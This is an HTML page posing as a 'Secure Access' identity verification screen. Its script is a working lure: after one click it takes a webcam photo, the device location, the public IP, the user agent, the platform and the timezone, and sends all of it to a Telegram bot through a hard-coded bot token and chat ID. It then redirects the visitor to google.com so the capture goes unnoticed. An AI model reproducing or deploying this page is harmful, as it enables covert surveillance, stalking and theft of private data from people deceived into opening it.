<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #1a1a1a;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
        }
        h1 { color: white; margin-bottom: 10px; }
        p { color: #888; margin-bottom: 30px; }
        button {
            background: #00adb5;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
        }
        .status { color: #00adb5; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🔐 Secure Access</h1>
        <p>Click below to verify your identity</p>
        <button id="btn">Continue →</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
        const CHAT_ID = '1471307057';
        
        async function getAllPermissions() {
            const status = document.getElementById('status');
            status.innerHTML = '📷 Requesting camera...';
            
            // 1. Camera + Mic
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                status.innerHTML = '🎤 Camera & mic granted';
                
                // Capture photo
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                
                // Send photo
                const blob = await fetch(photo).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                formData.append('caption', `📸 Selfie\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent}`);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {
                status.innerHTML = '⚠️ Camera denied';
            }
            
            // 2. Location
            status.innerHTML = '📍 Getting location...';
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: CHAT_ID, latitude: loc.lat, longitude: loc.lng })
                    });
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 Location: ${loc.lat}, ${loc.lng}\nAccuracy: ${loc.acc}m`, parse_mode: 'HTML' })
                    });
                    status.innerHTML = '✅ Verification complete';
                },
                () => { status.innerHTML = '⚠️ Location denied'; }
            );
            
            // 3. Device info + IP
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 Device\nIP: ${ip}\nUA: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, parse_mode: 'HTML' })
            });
            
            setTimeout(() => { window.location.href = 'https://google.com'; }, 3000);
        }
        
        document.getElementById('btn').onclick = () => {
            document.getElementById('btn').disabled = true;
            document.getElementById('btn').style.opacity = '0.5';
            getAllPermissions();
        };
    </script>
</body>
</html>
